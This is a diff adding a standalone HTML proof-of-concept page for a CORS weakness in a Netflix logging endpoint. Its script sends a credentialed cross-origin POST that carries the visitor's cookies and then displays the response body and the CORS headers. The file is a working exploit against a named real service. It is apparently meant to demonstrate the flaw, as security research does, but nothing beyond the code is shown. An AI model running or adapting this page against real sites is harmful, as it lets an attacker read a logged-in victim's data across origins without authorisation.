@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Netflix CORS PoC – logs endpoint</title>
+  <style>
+    body { font-family: monospace; background:#111; color:#eee; padding:2rem; }
+    button { padding:0.5rem 1rem; font-size:1rem; cursor:pointer; }
+    pre { background:#222; padding:1rem; border-radius:6px; max-height:400px; overflow:auto; }
+  </style>
+</head>
+<body>
+  <h2>Netflix CORS PoC – <code>logs.netflix.com/log/www/cl/2</code></h2>
+
+  <button onclick="doPoC()">Run exploit</button>
+  <pre id="out">Click the button to send a credentialed POST…</pre>
+
+  <script>
+  async function doPoC() {
+    const $out = document.getElementById('out');
+    $out.textContent = '⏳ Sending…';
+
+    try {
+      const res = await fetch('https://logs.netflix.com/log/www/cl/2', {
+        method: 'POST',
+        credentials: 'include',          // ← send victim cookies AND allow response reading
+        mode: 'cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ poc: true })
+      });
+
+      const text = await res.text();
+
+      $out.textContent =
+        `Status : ${res.status}\n` +
+        `ACAO   : ${res.headers.get('access-control-allow-origin')}\n` +
+        `ACAC   : ${res.headers.get('access-control-allow-credentials')}\n\n` +
+        (text ? text : '(empty body)');
+    } catch (err) {
+      $out.textContent = '❌ Blocked or failed:\n' + err;
+    }
+  }
+  </script>
+</body>
+</html>
